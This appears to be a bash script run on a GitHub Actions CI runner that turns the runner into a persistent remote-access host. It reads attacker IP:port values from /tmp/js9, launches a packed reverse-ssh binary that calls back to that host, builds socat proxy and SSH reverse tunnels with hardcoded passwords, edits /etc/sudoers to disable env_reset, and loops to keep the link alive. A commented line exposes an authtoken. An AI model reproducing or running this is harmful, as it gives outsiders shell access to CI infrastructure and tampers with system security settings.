# /home/runner/work/nc_test/nc_test/socat.bin -h
# proxy:<proxy-server>:<host>:<port>
#github cd/ci
#/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &



grep -q AABBCC_rev_shell /tmp/js9 &&
(
((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022)&)&

 sudo bash -c '
     sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
     grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '

    (while true; do
        [ ! -f /tmp/keepalive ] && break        
         num67z=$(date +%S);num76=$((${num67z}%2));
         bport=5005"$num76";echo $bport;

ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

ip_port7=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9)
port7=${ip_port7#*:};
ip7=${ip_port7%:*};

if [ ! -z ${port7} ] && [ ! -z ${ip7} ]; then
 ((/home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7}:127.0.0.1:2244,proxyport=${port7}  )&)&
  ((sleep 1;  
    (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 51194:127.0.0.1:1194   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 0.6;echo 1234567;
     echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:20022   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 0.6;
     (  for((i=0;i<11;i++));do  echo -e "\n";sleep 3;done )  )|script /tmp/nz_revsshx64
    
    
    
(
(ps aux | grep  "51194:127.0.0.1:1194"|grep -v grep) && echo 51194_ok || (
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 51194:127.0.0.1:1194   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 0.6;
   (  for((i=0;i<19;i++));do  echo -e "\n";sleep 3;done )  )|script /tmp/nz_z51194
)
)&

(
(ps aux | grep "40022:127.0.0.1:20022"|grep -v grep) && echo 40022_ok || (
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:20022   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 0.6;
   (  for((i=0;i<16;i++));do  echo -e "\n";sleep 3;done )  )|script /tmp/nz_z40022
)
)&

  )&)&
else
  if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then 
    sudo chmod 0777 $GITHUB_WORKSPACE/natapp;
 #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5; 
#else sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p 60021 cn-bj-plc-300.openfrp.cc ;
  fi

fi



sleep 6 ; 
         
    done) &
) &
